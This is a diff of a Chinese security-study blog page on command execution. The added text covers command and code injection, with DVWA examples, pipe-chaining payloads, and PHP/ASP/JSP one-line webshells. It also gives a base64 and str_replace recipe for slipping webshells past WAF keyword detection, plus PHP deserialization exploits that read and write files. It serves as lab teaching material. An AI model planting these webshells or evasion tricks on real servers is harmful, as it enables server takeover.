@@ -8,18 +8,35 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>命令执行原理与实践 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="扩展RCE：  remote command execution 远程命令执行，例如ipconfig–显示IP信息 remote code execution 远程代码执行，例如echo 1–1  注：文件上传也是RCE漏洞 PHP中能够执行系统命令的函数：exec、system、passthru、shell_exec、popen ping 127.0.0.1 | whoami        &#x2F;&#x2F;">
+  <meta name="description" content="命令执行漏洞原理与利用命令执行漏洞概念（1）远程命令执行漏洞(RCE)是指可以在仅有远程访问权限的情况下执行系统命令的漏洞，是安全漏洞中危害最大的一类。（2）在WEB应用中，远程命令执行漏洞通常分为命令注入和代码注入两类：  命令注入：可通过HTTP请求直接让服务端执行系统命令的漏洞，通常是由于系统命令执行函数引用了用户可控变量且未进行有效过滤引起的。 代码注入：可通过HTTP请求让服务端执行服务">
 <meta property="og:type" content="article">
 <meta property="og:title" content="命令执行原理与实践">
 <meta property="og:url" content="http://example.com/2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="扩展RCE：  remote command execution 远程命令执行，例如ipconfig–显示IP信息 remote code execution 远程代码执行，例如echo 1–1  注：文件上传也是RCE漏洞 PHP中能够执行系统命令的函数：exec、system、passthru、shell_exec、popen ping 127.0.0.1 | whoami        &#x2F;&#x2F;">
+<meta property="og:description" content="命令执行漏洞原理与利用命令执行漏洞概念（1）远程命令执行漏洞(RCE)是指可以在仅有远程访问权限的情况下执行系统命令的漏洞，是安全漏洞中危害最大的一类。（2）在WEB应用中，远程命令执行漏洞通常分为命令注入和代码注入两类：  命令注入：可通过HTTP请求直接让服务端执行系统命令的漏洞，通常是由于系统命令执行函数引用了用户可控变量且未进行有效过滤引起的。 代码注入：可通过HTTP请求让服务端执行服务">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/05/18/t4fHy5RmJZI9xKF.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/19/ikYMy2jREs3NTvC.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/19/RpfkmZXASMs3KFn.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/19/bXK56NxCut9dgfi.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/zXFf1i8bOaCqKsN.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/q2hM54WLzOpmsn3.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/Ge6B3PQHigwWICL.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/xSEsJ7DhnciReCV.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/TS7NPbkzrmv4EVI.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/ZJrNW3VRyBPzMXH.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/vIcHUGwF3WlxLgf.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/NDLdZaJiMkSqz7t.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/VyeszLBMiJokHNK.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/6cRVwHtk1JNjiU4.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/woOEyubeTHAh1Dr.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/20/KuM3hCgY6IpD5kT.png">
 <meta property="article:published_time" content="2021-05-09T08:19:30.000Z">
-<meta property="article:modified_time" content="2021-05-14T14:36:42.856Z">
+<meta property="article:modified_time" content="2021-05-20T16:27:09.348Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="安全进阶">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/18/t4fHy5RmJZI9xKF.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -175,39 +192,68 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>RCE：</p>
+        <h2 id="命令执行漏洞原理与利用"><a href="#命令执行漏洞原理与利用" class="headerlink" title="命令执行漏洞原理与利用"></a>命令执行漏洞原理与利用</h2><h3 id="命令执行漏洞概念"><a href="#命令执行漏洞概念" class="headerlink" title="命令执行漏洞概念"></a>命令执行漏洞概念</h3><p>（1）远程命令执行漏洞(RCE)是指可以在仅有远程访问权限的情况下执行系统命令的漏洞，是安全漏洞中危害最大的一类。<br>（2）在WEB应用中，远程命令执行漏洞通常分为<strong>命令注入</strong>和<strong>代码注入</strong>两类：</p>
 <ul>
-<li>remote command execution 远程命令执行，例如ipconfig–显示IP信息</li>
-<li>remote code execution 远程代码执行，例如echo 1–1</li>
+<li>命令注入：可通过HTTP请求直接让服务端执行系统命令的漏洞，通常是由于系统命令执行函数引用了用户可控变量且未进行有效过滤引起的。</li>
+<li>代码注入：可通过HTTP请求让服务端执行服务端WEB代码的漏洞，通过服务端WEB代码也可以实现服务端系统命令执行，此类漏洞通常是由于代码执行函数引用了用户可控变量且未进行有效过滤引起的。常用的一句话木马就是一个人为生成的代码注入漏洞。</li>
 </ul>
-<p>注：文件上传也是RCE漏洞</p>
-<p>PHP中能够执行系统命令的函数：exec、system、passthru、shell_exec、popen</p>
-<pre><code>ping 127.0.0.1 | whoami        //只会执行管道符后面的命令
+<p>（3）此外，其他一些安全漏洞在利用过程中也可能导致导致远程命令执行，如文件包含漏洞、反序列化漏洞等。</p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>（1）有的时候，开发web应用需要调用到一些能够执行系统命令的函数，如PHP中的system、exec、shell_exec、数据库的自定义函数UDF等，当用户能够控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令注入攻击。</p>
+<pre><code>//PHP系统命令执行函数：
+exec()、 system()、passthru()、shell_exec()、popen
+//JSP执行系统命令：
+Runtime run = Runtime.getRuntime();
+run.exec(&quot;ipconfig&quot;);
+//ASP执行系统命令：
+&lt;%Response.write 
+CreateObject(&quot;wscript.shell&quot;).exec(&quot;cmd.exe /c 
+ipconfig&quot;).StdOut.ReadAll%&gt;</code></pre>
+<p>（2）以DVWA为例</p>
+<p><img src="https://i.loli.net/2021/05/18/t4fHy5RmJZI9xKF.png" alt="image-20210518183136399"></p>
+<pre><code class="php">&lt;?php
 
-ping 127.0.0.1 || whoami       //执行两个命令
+if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;
+    // Get input
+    $target = $_REQUEST[ &#39;ip&#39; ];
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;
+        // Windows
+        $cmd = shell_exec( &#39;ping  &#39; . $target );
+    &#125;
+    else &#123;
+        // *nix
+        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
+    &#125;
+
+    // Feedback for the end user
+    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;
+&#125;
+?&gt;</code></pre>
+<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>（1）在之前的学习中，我们知道文件包含漏洞是可以造成php代码执行的。但是在如PHP等语言中，能够执行php代码的方法远不止文件包含这一种，比如危险的函数eval()。</p>
+<p>（2）代码注入的情况非常灵活，但究其原因仍离不开两个关键条件：第一是用用户能够控制函数的输入；第二是存在可以执行代码的危险函数。</p>
+<p>（3）常见的代码执行函数：</p>
+<pre><code>assert()
+eval()
+preg_repace()
+create_function()
+array_map()
+call_user_func()
+call_user_func_array()</code></pre>
+<h3 id="命令注入漏洞的测试与利用"><a href="#命令注入漏洞的测试与利用" class="headerlink" title="命令注入漏洞的测试与利用"></a>命令注入漏洞的测试与利用</h3><p>除了dir命令，我们还可以测试其他的命令，如ping，whoami，ipconfig，ifconfig，net user等，通过&amp;&amp;或者||符号进行拼接。</p>
+<pre><code>ping 127.0.0.1 | whoami        //只会执行管道符后面的命令
+ping 127.0.0.1 || whoami       //若第一个命令执行成功则不执行第二个命令
+
 ping 127.0.0.1 &amp; whoami        //执行两个命令
 ping 127.0.0.1 &amp;&amp; whoami       //执行两个命令</code></pre>
-<p>一句话木马工作流程：</p>
-<ul>
-<li>利用eval等危险函数引发远程代码执行，执行任意的PHP代码。</li>
-<li>利用PHP代码中的shell_exec、system等危险函数触发远程命令执行，查看电脑上的所有文件，并且可以执行系统命令，拿到了系统的权限</li>
-</ul>
-<pre><code>菜刀工具一般只能用POST方式传参。
-万能写法：
-&lt;?php
-    @eval($_REQUEST[&#39;cmd&#39;]);   //request可以接受get、post、cookie传的参数
-?&gt;</code></pre>
-<p>常见代码执行函数：</p>
-<p>assert()  断言。将字符串当作代码执行一次进行判断，判断是否为True。</p>
-<pre><code>&lt;?php
-    @assert($_GET[&#39;cmd&#39;]);   //使用GET方法需要在URL中手动传参。
-?&gt;
-
-例如：http://127.0.0.1/assert.php?cmd=system(&#39;phpinfo()&#39;)</code></pre>
-<p>eval()：将字符串当做PHP代码执行。</p>
-<p>preg_replace()：对字符串进行正则表达式的查找，如果查找到结果，则将结果替换为正则表达式的内容。（区别preg_match()：进行正则表达式的查找）</p>
-<pre><code>preg_replace(&quot;正则表达式&quot;,&quot;字符串&quot;,&quot;若匹配成功后替换的字符串&quot;)</code></pre>
-<p>create_function()：用户利用该函数创造自定义函数</p>
+<h3 id="代码注入漏洞的测试与利用"><a href="#代码注入漏洞的测试与利用" class="headerlink" title="代码注入漏洞的测试与利用"></a>代码注入漏洞的测试与利用</h3><p>PHP常见的够执行代码的函数：eval()、assert()、preg_repace()、create_function()等</p>
+<h4 id="案例1-eval函数"><a href="#案例1-eval函数" class="headerlink" title="案例1 eval函数"></a>案例1 eval函数</h4><p>eval函数会将字符串作为PHP代码执行，如常见的一句话后门程序：</p>
+<pre><code>&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;</code></pre>
+<h4 id="案例2-assert-函数"><a href="#案例2-assert-函数" class="headerlink" title="案例2 assert() 函数"></a>案例2 assert() 函数</h4><p><strong>验证assert后面的括号里的代码是否为true的函数。</strong>如果表达式不为true，那么则会给一个warning的警告<br>如：&lt;?php assert(‘1==2’);?&gt;<br>则会提醒：PHP Warning:  assert(): Assertion “1==2” failed in /usercode/file.php on line 1。<br>代码注入（对输入的数据过滤不严谨）：</p>
+<pre><code>assert.php?cmd=phpinfo() &lt;?php assert($_GET[&quot;cmd&quot;]);?&gt;</code></pre>
+<h4 id="案例3-preg-replace-函数-PHP-lt-5-5"><a href="#案例3-preg-replace-函数-PHP-lt-5-5" class="headerlink" title="案例3 preg_replace() 函数,PHP&lt;=5.5"></a>案例3 preg_replace() 函数,PHP&lt;=5.5</h4><p><strong>执行一个正则表达式的搜索和替换</strong><br>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])<br>搜索subject中匹配pattern的部分， 以replacement进行替换。<br><strong>当第一个参数的正则表达式有e修正符的时候，第二个参数的字符串当做PHP代码执行。</strong></p>
+<pre><code>preg_replace.php?cmd=phpinfo() &lt;?echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;cmd&quot;],&quot;jutst test&quot;);?&gt;</code></pre>
+<h4 id="案例4-create-function-函数"><a href="#案例4-create-function-函数" class="headerlink" title="案例4  create_function() 函数"></a>案例4  create_function() 函数</h4><p>php用户自定义函数 create_function()</p>
 <pre><code>/*   注释掉后面的所有代码
 &lt;?php 
 //?code = 2;&#125;phpinfo();/*
@@ -216,18 +262,125 @@ $str2 = &#39;echo test&#39;.$code.&quot;;&quot;;
 echo $str2;
 //$str2=echo test2;&#125;phpinfo();/*
 $func = create_function(&#39;$code&#39;,$str2);
-
+?&gt;
 相当于：
 function FT($code)&#123;
     echo test2;&#125;phpinfo();/*
+&#125;</code></pre>
+<h4 id="案例5：-array-map函数"><a href="#案例5：-array-map函数" class="headerlink" title="案例5： array_map函数"></a>案例5： array_map函数</h4><p>为数组的每个元素应用回调函数。</p>
+<pre><code class="php">array array_map(callable $callback , array $array1[,array $...])</code></pre>
+<p>array_map()：返回的结果是一个数组，由array1 每个元素应用 callback函数之后的结果组成。 callback 函数形参的数量和传给 array_map() 数组数量要一致。</p>
+<p>例如：</p>
+<pre><code class="php">&lt;?php
+function cube($n)
+&#123;
+    return($n * $n * $n);
 &#125;
-?&gt;</code></pre>
-<p>array_map函数、print_r()类似于echo，但会产生换行。</p>
-<p>call_user_func </p>
-<p>call_user_func_array</p>
-<p>ASP一句话木马</p>
-<p>wscript.exe文件</p>
-<h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><p>（1）能够绕过WAF的一句话木马：关键字检测</p>
+$a = array(1,2,3,4,5);
+$b = array_map(&quot;cube&quot;,$a);
+print_r($b);
+?&gt;
+
+/*
+Array&#123;
+[0]==&gt;1
+[1]==&gt;8
+[2]==&gt;27
+[3]==&gt;64
+[4]==&gt;125
+&#125;
+*/</code></pre>
+<pre><code class="php">&lt;?php
+    $evil_func = $_POST[func];
+    $evil_cmd = $_POST[cmd];
+    $some_array[0]=$evil_cmd;
+    $new_array = array_map($evil_func,$some_array);
+?&gt;
+ //POST传参：func=system&amp;cmd=whoami</code></pre>
+<h4 id="案例6：call-user-func函数"><a href="#案例6：call-user-func函数" class="headerlink" title="案例6：call_user_func函数"></a>案例6：call_user_func函数</h4><p>call_user_func是PHP的内置函数，该函数允许用户调用直接写的函数并传入一定的参数。</p>
+<pre><code class="php">&lt;?php
+//定义一个函数
+function nowamagic($a,$b)&#123;
+    echo $a;
+    echo $b;
+&#125;
+//call_user_func调用nowamagic
+call_user_func(&#39;nowamagic&#39;,&quot;111&quot;,&quot;222&quot;);
+call_user_func(&#39;nowamagic&#39;,&quot;333&quot;,&quot;444&quot;);
+?&gt;
+//输出111222333444</code></pre>
+<pre><code class="php">&lt;?php
+    $a = $_POST[func];
+    $b = $_POST[cmd];
+    call_user_func($a, $b);
+?&gt;
+ //POST传参：func=system&amp;cmd=whoami</code></pre>
+<p>案例7： call_user_func_array函数</p>
+<p>call_user_func_array函数和call_user_func很相似，只不过是换了一种方式传递了参数，让参数的结构更清晰。</p>
+<pre><code class="php">&lt;?php
+function a($b,$c)&#123;
+    echo $b;
+    echo $c;
+&#125;
+call_user_func_array(&#39;a&#39;,array(&quot;111&quot;,&quot;222&quot;));
+?&gt;
+//输出111222</code></pre>
+<pre><code class="php">&lt;?php
+    $a = $_POST[func];
+    $b = $_POST[cmd];
+    call_user_func_array($a, array($b));
+?&gt;
+ //POST传参：func=system&amp;cmd=whoami</code></pre>
+<h2 id="一句话木马原理及利用"><a href="#一句话木马原理及利用" class="headerlink" title="一句话木马原理及利用"></a>一句话木马原理及利用</h2><p>（1）WEBSHELL又称网页木马文件，根据开发语言的不同又分为ASP木马、PHP木马、JSP木马等，该类木马利用了脚本语言中的系统命令执行、文件读写等函数的功能，一旦上传到服务器被脚本引擎解析，攻击者就可以实现对服务器的控制。<br>（2）一句话木马 因其短小精悍不易被过滤又能与中国菜刀等工具配合使用的优势，成为了业界最使用的WEBshell类型。</p>
+<pre><code>PHP一句话木马：
+&lt;?php @eval($_POST[&#39;v&#39;]);?&gt;
+
+JSP一句话木马：
+&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getReal
+Path(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;
+
+ASP一句话木马：
+&lt;% eval request(&quot;v&quot;)%&gt;</code></pre>
+<h3 id="代码注入-1"><a href="#代码注入-1" class="headerlink" title="代码注入"></a>代码注入</h3><h4 id="PHP一句话木马"><a href="#PHP一句话木马" class="headerlink" title="PHP一句话木马"></a>PHP一句话木马</h4><p>PHP木马：</p>
+<pre><code>&lt;?php @eval($_POST[&#39;v&#39;]);?&gt;</code></pre>
+<p>evfal()函数会将参数作为PHP代码进行执行，因此通过参数V提交要执行的代码即可完成漏洞利用。</p>
+<p><img src="https://i.loli.net/2021/05/19/ikYMy2jREs3NTvC.png" alt="image-20210519231642691"></p>
+<h4 id="ASP一句话木马"><a href="#ASP一句话木马" class="headerlink" title="ASP一句话木马"></a>ASP一句话木马</h4><p>ASP木马：</p>
+<pre><code>&lt;%eval request(&quot;cmd&quot;)%&gt;</code></pre>
+<p>EVAL函数会将参数作为ASP代码进行执行，因此通过参数cmd提交要执行的代码即可完成漏洞利用。</p>
+<pre><code>http://10.10.10.135/1.asp?cmd=Execute(&quot;response.write 
+server.createobject(&quot;&quot;wscript.shell&quot;&quot;).exec(&quot;&quot;cmd.exe /c ipconfig&quot;&quot;).stdout.readall&quot;)</code></pre>
+<p><img src="https://i.loli.net/2021/05/19/RpfkmZXASMs3KFn.png" alt="image-20210519231857277"></p>
+<h4 id="JSP一句话木马"><a href="#JSP一句话木马" class="headerlink" title="JSP一句话木马"></a>JSP一句话木马</h4><pre><code>&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getReal
+Path(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;
+
+http://localhost/1.jsp?f=1.txt&amp;t=hello</code></pre>
+<p>JSP一句话木马可以向网站提交任意JSP代码并生成脚本文件</p>
+<pre><code>http://10.10.10.15:8080/2.jsp?pwd=023&amp;i=ipconfig</code></pre>
+<h3 id="过狗一句话原理"><a href="#过狗一句话原理" class="headerlink" title="过狗一句话原理"></a>过狗一句话原理</h3><p>（1）过狗常要用到三个函数：</p>
+<pre><code>str_replace(&#39;aa&#39;,&#39;a&#39;,$a); 
+ //1.被替换内容 2.用作替换内容 3.替换的内容
+base64_encode();         //加密
+base64_decode();         //解密</code></pre>
+<p>（2）原理：对一句话木马中的危险的回调函数assert等进行base64加密然后插入随便字符，然后用str_replace()函数替换，绕来绕去还是替换成assert($_POST[“v”]);的base64加密，然后再解密，就可以了。</p>
+<p><img src="https://i.loli.net/2021/05/19/bXK56NxCut9dgfi.png" alt="image-20210519232718097"></p>
+<h4 id="编写思路"><a href="#编写思路" class="headerlink" title="编写思路"></a>编写思路</h4><p>（1）准备好普通的一句话</p>
+<pre><code>assert($_POST[&quot;cmd&quot;]);</code></pre>
+<p>（2）对其中的危险性函数assert进行base64编码</p>
+<pre><code>base64编码：YXNzZXJ0
+加入混淆字符：YXNthinkingzZXJoeVatteJ0</code></pre>
+<p>（3）对YXNthinkingzZXJoeVatteJ0再次base64编码</p>
+<pre><code>WVhOdGhpbmtpbmd6WlhKb2VWYXR0ZUow</code></pre>
+<p>（4）对上述代码使用gzdeflate()对数据进行压缩</p>
+<pre><code>gzdeflate(&#39;WVhOdGhpbmtpbmd6WlhKb2VWYXR0ZUow&#39;);</code></pre>
+<p>（5）使用base64_decode和gzinflate进行嵌套，先解压缩再进行base64解码，再把值传入变量中(1-5的步骤主要是做了混淆处理)到这一步变量的值已经转回：YXNthinkingzZXJoeVatteJ0</p>
+<p>（6）定义函数将 YXNthinkingzZXJoeVatteJ0转化为assert：</p>
+<pre><code>base64_decode(YXNthinkingzZXJoeVatteJ0)
+</code></pre>
+<p>（7）经过函数的处理(cl)后cl($data)返回的值为assert，然后进行拼接，得到$a(@$_POST[‘cmd’]); </p>
+<p><strong>说明</strong>：str_replace($step_2,$step_1,$data); 的意思是在,$data数据里面寻找$step_2数组里面的数据，并使用$step_1数组的数据进行替换，且替换是数组中位置一一对应的。处理后得到的是YXNzZXJ0，再使用base64解码下就得到assert，并把assert返回到调用函数的位置。经过1-7的步骤：</p>
+<pre><code>$a(@$_POST[&#39;cmd&#39;]); == assert(@$_POST[&#39;cmd&#39;]);</code></pre>
+<h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>（1）能够绕过WAF的一句话木马：关键字检测</p>
 <pre><code>assert进行base64编码得YXNzZXJ0
 $a = YXNzadminZXJ0;
 $b = str_replace(&#39;admin&#39;,&#39;&#39;,$a);
@@ -246,9 +399,182 @@ $b();
 <p>（3）可使用异或的方法绕过。在PHP中^符号代表异或，相同为0，相异为1。</p>
 <pre><code>echo &quot; &quot; ^ &quot;a&quot; //空格和a异或，得到结果为A
 echo &quot; b&quot; ^ &quot;a &quot; //空格和a异或，b和空格异或，得到结果为AB</code></pre>
-<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>（1）序列化：(serialize)将对象的信息以字符串的形式保存起来。不会对类中的方法进行序列化，只会对类中的属性进行序列化。</p>
+<h2 id="PHP反序列化命令执行"><a href="#PHP反序列化命令执行" class="headerlink" title="PHP反序列化命令执行"></a>PHP反序列化命令执行</h2><p>（1）序列化 (Serialization)是一种将对象的状态信息转换为可以存储或传输的形式的过程（转化为信息流）。在序列化期间，对象将其当前状态写入到临时或持久性存储区以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p>
+<pre><code class="php">&lt;?php
+    class student&#123;
+        public $name = &#39;xiaoming&#39;;
+        public $age = 20;
+        public $score = 60;
+&#125;
+$A = new student();     //创建对象
+$A -&gt; name = &#39;sr&#39;;     //给对象name属性赋值
+$un1 = serialize($A);     //序列化
+echo $un1;
+$un2 = var_dump(unserialize($un1));    //反序列化
+/*
+var_dump是PHP中的调试函数，用于判断一个变量的类型与长度，并输出变量的数值。用var_dump打印所有的对象，可以查看对象内部的数据结构；var_dump里面的变量必须是存在的。
+*/
+echo $un2; //或者print_r($un2);
+?&gt;
+//序列化内容：O:7:&quot;student&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;sr&quot;;s:3:&quot;age&quot;;i:20;s:5:&quot;score&quot;;i:60;&#125;
+//反序列化内容：
+object(student)#2 (3) &#123;
+  [&quot;name&quot;]=&gt;
+  string(2) &quot;sr&quot;
+  [&quot;age&quot;]=&gt;
+  int(20)
+  [&quot;score&quot;]=&gt;
+  int(60)
+&#125;</code></pre>
+<p><img src="https://i.loli.net/2021/05/20/zXFf1i8bOaCqKsN.png" alt="image-20210520155326069"></p>
+<p>（2）序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。unserialize()函数能够重新把字符串变回php原来的值。</p>
+<h3 id="序列化的目的"><a href="#序列化的目的" class="headerlink" title="序列化的目的"></a>序列化的目的</h3><p>（1）以某种存储形式使自定义对象持久化</p>
+<ul>
+<li>比如说刚才的类里面保存着学生的个人信息，我想要将这些信息保存起来，以后可以随时取出来用，就可以采用序列化。将一个Word保存为docx，这就是序列化的过程。打开docx文档，显示内容，就是反序列化的过程。</li>
+</ul>
+<p>（2）将对象从一个地方传递到另一个地方</p>
+<ul>
+<li>比如说在进行网络传输的过程中，发送数据和接收数据都是通过byte[]来获取的时候，如果你要发送一个对象，需要进行序列化。 然后接受数据的时候进行反序列化，还原对象。</li>
+</ul>
+<p>（3）使程序更具维护性</p>
+<ul>
+<li>序列化可以将内存中的对象保存到本地文件和数据库中，大大提高了代码的可维护性。</li>
+</ul>
+<h3 id="序列化的基本用法"><a href="#序列化的基本用法" class="headerlink" title="序列化的基本用法"></a>序列化的基本用法</h3><p>（1）O:7:”student”:3:{s:4:”name”;s:8:”xiaoming”;s:3:”age”;i:20;s:5:”score”;i:60;}</p>
+<pre><code>O:对象名长度:“对象名”:对象成员变量个数:&#123;变量1类型:变量名1长度:”变量名
+1“;参数1类型:参数1长度:”参数1“;变量2类型:变量名2长度:“变量名2”;参数2类
+型:参数2长度:”参数2“;… …&#125;</code></pre>
+<p><img src="https://i.loli.net/2021/05/20/q2hM54WLzOpmsn3.png" alt="image-20210520162534792"></p>
+<p>（2）序列化：serialize()使用函数serialize()序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 </p>
+<p>（3）反序列化：unserialize()unserialize() 对已序列化的变量进行操作，重新生成一个对象。</p>
+<h3 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h3><p>（1）漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且<strong>魔术方法</strong>中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
+<p>（2）PHP的类中可能会包含一些特殊的函数叫魔术函数，魔术函数命名是以符号__开头的，比如：</p>
+<pre><code>__construct(), __destruct() __call(), __callStatic() __get(), __set() __isset(), __unset() __sleep(), __wakeup() __toString() __invoke() __set_state() __clone() __debugInfo()</code></pre>
+<p>（3）这些函数在某些情况下会自动调用，其中，反序列化漏洞主要由以下面魔术方法造成：</p>
+<ul>
+<li><strong>__construct()：在对象创建时自动被调用；</strong></li>
+<li> __sleep()：在对象序列化的时候自动被调用；</li>
+<li>__destruct()：在脚本运行结束时自动被调用；</li>
+<li><strong>__wakeup()：在反序列化为对象时自动被调用；</strong></li>
+<li>__toString()： 直接输出对象引用时自动被调用；</li>
+</ul>
+<p>（4）__sleep()</p>
+<p><img src="https://i.loli.net/2021/05/20/Ge6B3PQHigwWICL.png" alt="image-20210520163201001"></p>
+<p>（5）__wakeup()</p>
+<p><img src="https://i.loli.net/2021/05/20/xSEsJ7DhnciReCV.png" alt="image-20210520163240789"></p>
+<p>（6）__destruct()</p>
+<p><img src="https://i.loli.net/2021/05/20/TS7NPbkzrmv4EVI.png" alt="image-20210520163308195"></p>
+<p>（7）__tostring()</p>
+<p><img src="https://i.loli.net/2021/05/20/ZJrNW3VRyBPzMXH.png" alt="image-20210520163330738"></p>
+<h3 id="反序列化漏洞的示例"><a href="#反序列化漏洞的示例" class="headerlink" title="反序列化漏洞的示例"></a>反序列化漏洞的示例</h3><p>（1）反序列化导致任意文件读取。以get方式传参，若要获取1.txt 的内容，先将public $filename=’1.txt’ 时的属性进行序列化。</p>
+<p><img src="https://i.loli.net/2021/05/20/vIcHUGwF3WlxLgf.png" alt="image-20210520172039782"></p>
+<pre><code class="php">&lt;?php
+    class FileClass&#123;
+    public $filename = &#39;1.txt&#39;;
+    public function __toString()&#123;
+        return file_get_contents($this-&gt;filename);
+    &#125;
+&#125;
+$file = new FileClass();
+$a = serialize($file);
+echo $a;
+?&gt;
+// 输入序列化的结果为：O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;&#125;</code></pre>
+<p>在前端以GET方法传输序列化结果。</p>
+<pre><code class="php">&lt;?php
+    class FileClass&#123;
+    public $filename = &#39;error.log&#39;;
+    public function __toString()&#123;
+        return file_get_contents($this-&gt;filename);
+    &#125;
+&#125;
+$obj = unserialize($_GET[&#39;file&#39;]);
+echo $obj;
+?&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/05/20/NDLdZaJiMkSqz7t.png" alt="image-20210520172121942"></p>
+<p>（2）利用反序列化写入文件</p>
+<pre><code class="php">&lt;?php
+    class A&#123;
+    var $a = &quot;&lt;?php phpinfo();?&gt;&quot;;
+    function __destruct()&#123;
+        $fp = fopen(&quot;D:\\SecurityTools\\phpStudy\\phpstudy_pro\\WWW\\hello.php&quot;,&quot;w&quot;);
+        fputs($fp,$this-&gt;a);
+        fclose($fp);
+    &#125;
+&#125;
+$file = new A();
+$a = serialize($file);
+echo $a;
+?&gt;
+// 得到序列化结果为O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</code></pre>
+<p>在前端以post方法传输序列化结果</p>
+<pre><code class="php">&lt;?php
+    class A&#123;
+    var $a = &quot;&lt;?php phpinfo();?&gt;&quot;;
+    function __destruct()&#123;
+        $fp = fopen(&quot;D:\\SecurityTools\\phpStudy\\phpstudy_pro\\WWW\\hello.php&quot;,&quot;w&quot;);
+        fputs($fp,$this-&gt;a);
+        fclose($fp);
+    &#125;
+&#125;
+$test = $_POST[&#39;test&#39;];
+$test_unser = unserialize($test);
+?&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/05/20/VyeszLBMiJokHNK.png" alt="image-20210520174349587"></p>
+<p><img src="https://i.loli.net/2021/05/20/6cRVwHtk1JNjiU4.png" alt="image-20210520174414040"></p>
+<p><img src="https://i.loli.net/2021/05/20/woOEyubeTHAh1Dr.png" alt="image-20210520174429339"></p>
+<p><img src="https://i.loli.net/2021/05/20/KuM3hCgY6IpD5kT.png" alt="image-20210520180942260"></p>
+<h2 id="扩展-1"><a href="#扩展-1" class="headerlink" title="扩展"></a>扩展</h2><p>RCE：</p>
+<ul>
+<li>remote command execution 远程命令执行，例如ipconfig–显示IP信息</li>
+<li>remote code execution 远程代码执行，例如echo 1–1</li>
+</ul>
+<p>注：文件上传也是RCE漏洞</p>
+<p>一句话木马工作流程：</p>
+<ul>
+<li>利用eval等危险函数引发远程代码执行，执行任意的PHP代码。</li>
+<li>利用PHP代码中的shell_exec、system等危险函数触发远程命令执行，查看电脑上的所有文件，并且可以执行系统命令，拿到了系统的权限</li>
+</ul>
+<pre><code>菜刀工具一般只能用POST方式传参。
+万能写法：
+&lt;?php
+    @eval($_REQUEST[&#39;cmd&#39;]);   //request可以接受get、post、cookie传的参数
+?&gt;</code></pre>
+<p>常见代码执行函数：</p>
+<p>assert()  断言。将字符串当作代码执行一次进行判断，判断是否为True。</p>
+<pre><code>&lt;?php
+    @assert($_GET[&#39;cmd&#39;]);   //使用GET方法需要在URL中手动传参。
+?&gt;
+
+例如：http://127.0.0.1/assert.php?cmd=system(&#39;phpinfo()&#39;)</code></pre>
